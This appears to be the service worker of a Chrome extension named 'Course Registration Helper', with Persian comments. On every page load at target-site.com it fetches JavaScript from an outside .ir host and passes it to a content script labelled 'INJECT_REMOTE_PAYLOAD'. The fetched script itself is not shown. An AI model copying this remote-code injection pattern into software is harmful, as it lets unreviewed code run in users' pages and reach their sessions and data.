chrome.runtime.onInstalled.addListener(() => {
  console.log('Course Registration Helper installed.');
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'moreLink') {
    chrome.tabs.create({ url: message.url });
  }
});


// sw.js (Manifest V3 Service Worker)

const PAYLOAD_URL = "https://EhsanGhodrati.ir/hut/golestanstyle.js";

async function fetchPayloadText() {
  const res = await fetch(PAYLOAD_URL, {
    method: "GET",
    cache: "no-store"
  });

  if (!res.ok) {
    throw new Error(`Payload fetch failed: ${res.status} ${res.statusText}`);
  }

  // اگر سرور gz/brotli میده، مرورگر خودش decode می‌کنه.
  const text = await res.text();
  return text;
}

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  // وقتی صفحه کامل شد، payload رو بفرست.
  if (changeInfo.status !== "complete") return;

  // اطمینان از اینکه URL تب همون سایتیه که می‌خوای
  if (!tab.url || !tab.url.startsWith("https://target-site.com/")) return;

  try {
    const payloadText = await fetchPayloadText();

    chrome.tabs.sendMessage(tabId, {
      type: "INJECT_REMOTE_PAYLOAD",
      payloadText
    });
  } catch (err) {
    console.error("Failed to fetch/send payload:", err);
  }
});








chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete") return;
  if (!tab.url?.startsWith("https://target-site.com/")) return;

  chrome.scripting.insertCSS({
    target: { tabId },
    files: ["css/fonts.css"]
  });
});






